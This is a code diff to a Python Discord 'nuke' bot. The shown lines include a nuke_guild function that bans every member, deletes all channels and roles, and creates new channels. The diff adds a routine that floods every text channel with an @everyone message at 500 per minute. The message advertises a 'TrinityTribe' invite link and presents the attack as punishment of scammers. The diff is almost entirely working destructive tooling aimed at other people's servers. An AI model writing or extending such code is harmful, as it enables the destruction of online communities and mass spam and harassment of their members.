@@ -78,23 +78,37 @@ async def create_text_channels(guild, name):
             print(f'Error creating text channel: {e}')
     return created
 
+# Async function to spam every channel in a guild
+async def spam_messages_in_channels(guild, message, rate_per_minute=500):
+    wait_time = 60 / rate_per_minute
+    for channel in guild.text_channels:
+        for _ in range(rate_per_minute):
+            try:
+                await channel.send(message)
+            except discord.HTTPException as e:
+                print(f'Error sending message to {channel.name}: {e}')
+            await asyncio.sleep(wait_time)
+
 # Async function to nuke a guild (delete channels, roles, ban members, create channels)
 async def nuke_guild(guild, name):
-    print(f'{dr}Nuke: {m}{guild.name}')
+    print(f'Nuke: {guild.name}')
     
     banned = await ban_all_members(guild)
-    print(f'{m}Banned:{b}{banned}')
+    print(f'Banned: {banned}')
     
     deleted_channels = await delete_all_channels(guild)
-    print(f'{m}Deleted Channels:{b}{deleted_channels}')
+    print(f'Deleted Channels: {deleted_channels}')
     
     deleted_roles = await delete_all_roles(guild)
-    print(f'{m}Deleted Roles:{b}{deleted_roles}')
+    print(f'Deleted Roles: {deleted_roles}')
     
     created_channels = await create_text_channels(guild, name)
-    print(f'{m}Created Text Channels:{b}{created_channels}')
+    print(f'Created Text Channels: {created_channels}')
     
-    print(f'{dr}--------------------------------------------\n\n')
+    spam_message = "@everyone Get nuked by TrinityTribe! Stop Scamming! Keep the world in peace! https://discord.gg/TrinityTribe"
+    await spam_messages_in_channels(guild, spam_message)
+    
+    print('--------------------------------------------\n\n')
 
 # Main program loop
 while True:
